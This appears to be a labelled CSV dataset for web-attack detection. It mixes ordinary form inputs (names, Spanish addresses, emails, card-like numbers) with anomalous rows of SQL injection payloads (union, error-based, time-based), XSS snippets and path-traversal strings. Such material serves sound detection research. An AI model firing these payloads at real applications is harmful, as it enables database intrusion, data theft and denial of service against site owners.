payload,length,attack_type,label
"-2864') or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('vjbl'='vjbl",220,sqli,anom
1');select (case when (6804=7050) then 6804 else cast(1 as int)/(select 0 from dual) end) from dual--,101,sqli,anom
begley,6,norm,norm
//..{file},10,path-traversal,anom
"1))) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (((8382=8382",192,sqli,anom
-4023 or (8779=5716)*5716,25,sqli,anom
"-3697'))) union all select 5180,5180,5180,5180,5180,5180,5180--",63,sqli,anom
luxford_baumann@lasiestacreativa.tel,36,norm,norm
1%') and (7704=3494)*3494 and ('%'=',36,sqli,anom
muskiz,6,norm,norm
"1"")) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ((""mmvu""=""mmvu",83,sqli,anom
1 where 8889=8889;if(7899=7899) select 7899 else drop function zbbp--,69,sqli,anom
"-2314"")) or make_set(9354=9354,7185) and ((""uatq"" like ""uatq",60,sqli,anom
"1"")) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((""auyv""=""auyv",255,sqli,anom
"1"") where 3507=3507;select benchmark(5000000,md5(0x4c4d6142))--",63,sqli,anom
"1);select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",94,sqli,anom
mageto,6,norm,norm
6193259075510468,16,norm,norm
48064800k,9,norm,norm
demonlatra,10,norm,norm
"1"" rlike (select * from (select(sleep(5)))sgvo) and ""cxsu"" like ""cxsu",69,sqli,anom
9478,4,norm,norm
"1) where 6150=6150;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",79,sqli,anom
33784,5,norm,norm
1 and 7533=7533# absp,21,sqli,anom
"1'))) union all select null,null,null,null,null,null,null,null,null--",69,sqli,anom
"1',(select * from generate_series(2636,2636,case when (2636=7071) then 1 else 0 end) limit 1)",93,sqli,anom
"1';select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'kiex'='kiex",109,sqli,anom
"c/ jara 9,",10,norm,norm
"1%'));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (('%'='",103,sqli,anom
arqu rocas,10,norm,norm
despamplonar,12,norm,norm
1') rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ('gzpx'='gzpx,81,sqli,anom
sofia,5,norm,norm
2145088995876898,16,norm,norm
72094500b,9,norm,norm
entendimiento,13,norm,norm
1')) as zbkp where 1720=1720 and 4110=6748#,43,sqli,anom
derbyshi,8,norm,norm
"c/ lope de rueda s/n, 9-f",25,norm,norm
6054,4,norm,norm
50212,5,norm,norm
candombe,8,norm,norm
campanini-adamson@barebackspain.kh,34,norm,norm
normando,8,norm,norm
1') where 2763=2763;(select * from (select(sleep(5)))srmq)--,60,sqli,anom
"1') where 6746=6746 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",151,sqli,anom
knyht9@aspirantes.lt,20,norm,norm
8859240955120408,16,norm,norm
"<xml id=xss src=""xsstest.xml"" id=i></xml><span dataid=xss src=#i datafld=c dataformatas=html></span>",100,xss,anom
"-9854%""))) or 6455=3652",23,sqli,anom
"1"" and 2006=2006",16,sqli,anom
-9145') or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ('yvfl' like 'yvfl,123,sqli,anom
arancn,6,norm,norm
49216,5,norm,norm
09069193v,9,norm,norm
aragons,7,norm,norm
05848,5,norm,norm
"-4764"")) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((""dfvz"" like ""dfvz",212,sqli,anom
"calle uruguay, 161, 11-c",24,norm,norm
"1%') or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ('%'='",108,sqli,anom
9490117587717675,16,norm,norm
pilotaje,8,norm,norm
aylmar6,7,norm,norm
"-7138"" union all select 2341,2341,2341,2341--",45,sqli,anom
keer,4,norm,norm
uzaki@23horas.ie,16,norm,norm
40197,5,norm,norm
"c/ nogueira, 86 11b",19,norm,norm
raab,4,norm,norm
"1"") where 9447=9447;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",120,sqli,anom
"1%"") or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",156,sqli,anom
34,2,norm,norm
"1"") where 7452=7452;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",136,sqli,anom
59760678p,9,norm,norm
nava de bjar,12,norm,norm
1' where 9024=9024 rlike (select * from (select(sleep(5)))sgvo)--,65,sqli,anom
staggs,6,norm,norm
guillory,8,norm,norm
2663409898988215,16,norm,norm
"1%' and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and '%'='",152,sqli,anom
ninn,4,norm,norm
"1"" where 9792=9792 rlike (select * from (select(sleep(5)))vwyq)#",64,sqli,anom
chua@comerciosdeaspe.om,23,norm,norm
"santa leonor, 187, 7?h",22,norm,norm
"1"")) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ((""oxvw""=""oxvw",125,sqli,anom
98501968y,9,norm,norm
asia,4,norm,norm
muenster@introito.th,20,norm,norm
"1 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)",171,sqli,anom
"1' or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",78,sqli,anom
1'+(select 'ohdf' where 7878=7878 and 5678=3277--,49,sqli,anom
alcolea,7,norm,norm
"1%"" or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ""%""=""",183,sqli,anom
9845728819454113,16,norm,norm
jailyn,6,norm,norm
><img id=xss src=x onerror=alert(xss);>,39,xss,anom
petronil,8,norm,norm
"1')));select benchmark(5000000,md5(0x4c4d6142)) and ((('lijy'='lijy",67,sqli,anom
comiso,6,norm,norm
/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../{file},325,path-traversal,anom
gorius,6,norm,norm
"1)) as jrzr where 5194=5194 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",168,sqli,anom
"1""))) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",67,sqli,anom
1 rlike (select * from (select(sleep(5)))sgvo),46,sqli,anom
"-6067'+(select 'bfhf' where 3114=3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",96,sqli,anom
/..{file},9,path-traversal,anom
manciles,8,norm,norm
c/ virgen de begoa 43,21,norm,norm
"1' where 6135=6135;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",135,sqli,anom
83475055m,9,norm,norm
"1');select benchmark(5000000,md5(0x4c4d6142)) and ('dvpw'='dvpw",63,sqli,anom
javiera,7,norm,norm
"1%"") or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and (""%""=""",216,sqli,anom
8578275476079932,16,norm,norm
"1"")) as uqkn where 4642=4642 or elt(6272=6272,sleep(5))--",57,sqli,anom
7633,4,norm,norm
rider,5,norm,norm
denver,6,norm,norm
lovas@djbroadcast.bn,20,norm,norm
musi@inmobiliariahangar.vn,26,norm,norm
"1%') and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",145,sqli,anom
bruna,5,norm,norm
collazos de boedo,17,norm,norm
husky_hurlic@ropadegolf.sn,26,norm,norm
sukarrieta,10,norm,norm
patacki,7,norm,norm
8paam277to,10,norm,norm
"1"" where 3933=3933 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--",109,sqli,anom
54180440f,9,norm,norm
5277423827718841,16,norm,norm
5003,4,norm,norm
1' or 6793=(select 6793 from pg_sleep(5)) and 'hokd'='hokd,58,sqli,anom
arimany aguila,14,norm,norm
zarra,5,norm,norm
25410,5,norm,norm
chinaphan@viajesdacapalla.eh,28,norm,norm
1er87n30689,11,norm,norm
huerfanidad,11,norm,norm
reynna,6,norm,norm
-9072) as saot where 2278=2278 order by 1#,42,sqli,anom
"1"")) as vxkn where 2443=2443 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",180,sqli,anom
gorcy.davis@carmensanmartin.bo,30,norm,norm
"-1593' or elt(7044=6125,6125) and 'zkuz'='zkuz",46,sqli,anom
"1"")) and 8329=5584#",19,sqli,anom
37500,5,norm,norm
"plaza diego herrera lorenzo, 148 8?e",36,norm,norm
03786,5,norm,norm
"-1868"") where 9495=9495 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",154,sqli,anom
"1%"" and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",99,sqli,anom
"-5052))) union all select 8351,8351,8351,8351#",46,sqli,anom
iftekhar,8,norm,norm
bols,4,norm,norm
45053569l,9,norm,norm
04ega9i2a,9,norm,norm
1')) and 8594=(select 8594 from pg_sleep(5))--,46,sqli,anom
"c/ iglesia, 37, 12?c",20,norm,norm
dorian,6,norm,norm
lugo,4,norm,norm
"1) as bgvd where 1753=1753 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",179,sqli,anom
"1%"")));call regexp_substring(repeat(right(char(2385),0),500000000),null)--",74,sqli,anom
"masia can sang, 33",18,norm,norm
1'+(select somn where 8636=8636 rlike sleep(5))+',49,sqli,anom
"1' union all select null,null,null,null,null,null,null,null--",61,sqli,anom
"1')) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and (('mexd' like 'mexd",118,sqli,anom
97426856y,9,norm,norm
"1"";select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",87,sqli,anom
alfonso.julissa@naturalchild.tk,31,norm,norm
"avinguda carrilet, 21,",22,norm,norm
melcocha,8,norm,norm
7410007052744340,16,norm,norm
"1')) as wves where 2641=2641 and 2388=benchmark(5000000,md5(0x6d457153))#",73,sqli,anom
40380,5,norm,norm
"1')) union all select null,null,null,null,null,null,null--",58,sqli,anom
birk2,5,norm,norm
midkiff_mikuni@directoriogratuito.kh,36,norm,norm
rea+tino,8,norm,norm
"chopo, 10",9,norm,norm
donet acst,10,norm,norm
1' in boolean mode);waitfor delay '0:0:5'#,42,sqli,anom
13189,5,norm,norm
hewitt,6,norm,norm
31153,5,norm,norm
"(select like('abcdefg',upper(hex(randomblob(500000000/2)))))",60,sqli,anom
pi,2,norm,norm
6622,4,norm,norm
zumaran solsona,15,norm,norm
us,2,norm,norm
frieda6,7,norm,norm
"1) as qodq where 4945=4945 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",121,sqli,anom
"1"")) as thoj where 1577=1577 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",166,sqli,anom
21444030a,9,norm,norm
palazuelos de eresma,20,norm,norm
"1');select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ('afdy' like 'afdy",85,sqli,anom
laxis7o,7,norm,norm
gasull vadell,13,norm,norm
"-9659))) union all select 8665,8665,8665,8665,8665,8665,8665--",62,sqli,anom
elias pallares,14,norm,norm
20180,5,norm,norm
"1') as zxho where 5907=5907 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",89,sqli,anom
26532,5,norm,norm
"1)) as vzgo where 6281=6281 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",123,sqli,anom
argelio,7,norm,norm
19127,5,norm,norm
"-4596"" union all select 5761#",29,sqli,anom
frailes,7,norm,norm
fisas,5,norm,norm
2111,4,norm,norm
zapach,6,norm,norm
25g0a00,7,norm,norm
36844689t,9,norm,norm
barnechea,9,norm,norm
1'));begin user_lock.sleep(5); end and (('pfrt'='pfrt,53,sqli,anom
gavald,6,norm,norm
zuiga urbina,12,norm,norm
"1) as zmjm where 9125=9125 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",132,sqli,anom
"<meta http-equiv=""set-cookie"" content=""userid=<script>document.cookie=true</script>"">",85,xss,anom
cel65co,7,norm,norm
"robert graves, 101",18,norm,norm
"1%"");select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (""%""=""",101,sqli,anom
somisett,8,norm,norm
1206132385577691,16,norm,norm
"1"")) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((""dbxi"" like ""dbxi",168,sqli,anom
"1'))) or 8421=(select count(*) from generate_series(1,5000000)) and ((('tfnb'='tfnb",83,sqli,anom
"1'))) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((('iari'='iari",85,sqli,anom
"1'||(select 'wqmz' where 6400=6400 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x))||'",240,sqli,anom
terrassa,8,norm,norm
/./.././.././.././.././.././../{file},37,path-traversal,anom
bartowna@professionalhost.do,28,norm,norm
"1%') union all select null,null,null,null,null,null,null,null,null#",67,sqli,anom
"1"")) rlike (select * from (select(sleep(5)))sgvo) and ((""grct""=""grct",68,sqli,anom
6769,4,norm,norm
97925933y,9,norm,norm
hilton,6,norm,norm
1438,4,norm,norm
matthews.russa@pensionesbaratas.com.bi,38,norm,norm
"1%') or 8156=(select count(*) from generate_series(1,5000000))--",64,sqli,anom
morales orpinell,16,norm,norm
1')) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (('trzi'='trzi,83,sqli,anom
09251630h,9,norm,norm
alabiada,8,norm,norm
cousinea,8,norm,norm
"1' where 4388=4388;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",103,sqli,anom
"-1303' union all select 4840,4840#",34,sqli,anom
"1 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)",92,sqli,anom
"1)) union all select null,null,null,null,null,null,null,null--",62,sqli,anom
"-1922%') union all select 2335,2335,2335,2335,2335,2335,2335,2335,2335,2335--",77,sqli,anom
"1%"" or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ""%""=""",102,sqli,anom
segu fustero,12,norm,norm
"1%') union all select null,null,null,null--",43,sqli,anom
"-5130')) union all select 5218,5218,5218,5218,5218,5218,5218,5218,5218,5218--",77,sqli,anom
nevel,5,norm,norm
1')) as bswc where 1635=1635 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,233,sqli,anom
dalia,5,norm,norm
"1'+(select 'sqje' where 1634=1634 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)))+'",138,sqli,anom
1) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (9932=9932,204,sqli,anom
69299598t,9,norm,norm
"1"")) as ajwe where 1153=1153 rlike (select (case when (7689=7689) then 1 else 0x28 end))--",90,sqli,anom
-6984 order by 1#,17,sqli,anom
floor@aebo.af,13,norm,norm
9516066261417526,16,norm,norm
"1'||(select 'eils' where 8308=8308 or 8514=benchmark(5000000,md5(0x544d5a4c))#",78,sqli,anom
chakiris@forohh.sa,18,norm,norm
wildbolz.deste@meneamex.sg,26,norm,norm
29540,5,norm,norm
"1));select benchmark(5000000,md5(0x4c4d6142)) and ((6866=6866",61,sqli,anom
"1'+(select 'arzm' where 6464=6464 or 8466=benchmark(5000000,md5(0x694a4745)))+'",79,sqli,anom
73107657h,9,norm,norm
ireland-lamargue@arrsys.ba,26,norm,norm
"-1<body onload=""document.cookie=true;"">",39,xss,anom
1')) rlike (select (case when (8489=8820) then 1 else 0x28 end)) and (('fbjf'='fbjf,83,sqli,anom
"1"" union all select null#",25,sqli,anom
chanampa coromino,17,norm,norm
12064316b,9,norm,norm
5968115219030593,16,norm,norm
"1"");select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--",97,sqli,anom
"1"") where 5197=5197 and elt(3114=3114,sleep(5))#",48,sqli,anom
0401288108131816,16,norm,norm
"1;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3-- ampw",91,sqli,anom
"1' or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)",107,sqli,anom
"c/ salvador 64, 5c",18,norm,norm
22311,5,norm,norm
mordi3nt-e,10,norm,norm
caravaca de la cruz,19,norm,norm
"juan xxii 24, 3?c",17,norm,norm
1'||(select 'avxz' from dual where 7815=7815;select (case when (4935=4734) then 4935 else 4935*(select 4935 from mysql.db) end)#,128,sqli,anom
7496121103658289,16,norm,norm
"1;call regexp_substring(repeat(right(char(3702),0),500000000),null)# huhw",73,sqli,anom
"1"") as evoq where 8193=8193 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",133,sqli,anom
saya,4,norm,norm
8484,4,norm,norm
"1')) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (('stqq'='stqq",97,sqli,anom
"1%""))) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (((""%""=""",218,sqli,anom
brittani,8,norm,norm
palera,6,norm,norm
"1"" where 9889=9889;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",103,sqli,anom
quel,4,norm,norm
6968107643811968,16,norm,norm
"1'))) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((('msjw' like 'msjw",136,sqli,anom
"1"")) as ftts where 3671=3671 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",226,sqli,anom
sant lloren savall,18,norm,norm
zaldibia,8,norm,norm
quintanar de la orden,21,norm,norm
3548348718435303,16,norm,norm
no3otr46,8,norm,norm
cherwin4@xavipetit.mu,21,norm,norm
"calle obispo miguel bucarelli, 63",33,norm,norm
"-6870"") as deox where 8198=8198 union all select 8198#",54,sqli,anom
alesis,6,norm,norm
rascadura,9,norm,norm
5331,4,norm,norm
'true',6,cmdi,anom
baltasar,8,norm,norm
"<object type=""text/x-scriptlet"" data=""http://ha.ckers.org/scriptlet.html""></object>",83,xss,anom
-4785' or (8459=8459)*4906 and 'esfn'='esfn,43,sqli,anom
05591,5,norm,norm
"1%"")) union all select null,null,null,null#",43,sqli,anom
superable,9,norm,norm
"zafiro, s/n 4?b",15,norm,norm
moretti alegre,14,norm,norm
josias,6,norm,norm
micaas,6,norm,norm
"1""))) or 4240=(select 4240 from pg_sleep(5))--",46,sqli,anom
c/ codigo correspondencia oficial correos-telegrafos 184,56,norm,norm
6894,4,norm,norm
1523492896649032,16,norm,norm
ortega sacrista,15,norm,norm
andrease,8,norm,norm
3288111380573813,16,norm,norm
0u5o,4,norm,norm
-6757'))) or 4524=3696,22,sqli,anom
"villares de soria, los",22,norm,norm
manjarrs,8,norm,norm
"1' and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)",96,sqli,anom
9327671462034435,16,norm,norm
/..../..../..../..../..../..../..../{file},42,path-traversal,anom
-5299 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))),185,sqli,anom
"1%"");select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",101,sqli,anom
"1)) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ((5524=5524",111,sqli,anom
nelia3,6,norm,norm
70153248m,9,norm,norm
maliski,7,norm,norm
"1) as mnyy where 4409=4409 union all select null,null,null,null--",65,sqli,anom
"1'+(select 'uzaw' where 9900=9900 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3))+'",136,sqli,anom
70825753j,9,norm,norm
"1%""))) or 8466=benchmark(5000000,md5(0x694a4745)) and (((""%""=""",62,sqli,anom
5244748375620408,16,norm,norm
03291016s,9,norm,norm
"1"");if(3831=9321) select 3831 else drop function ybru--",55,sqli,anom
"-3609"")) as fzyp where 9474=9474 or 9323=9323#",46,sqli,anom
c/ rio segura 76,16,norm,norm
83607535m,9,norm,norm
"1""))) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (((""jywy"" like ""jywy",160,sqli,anom
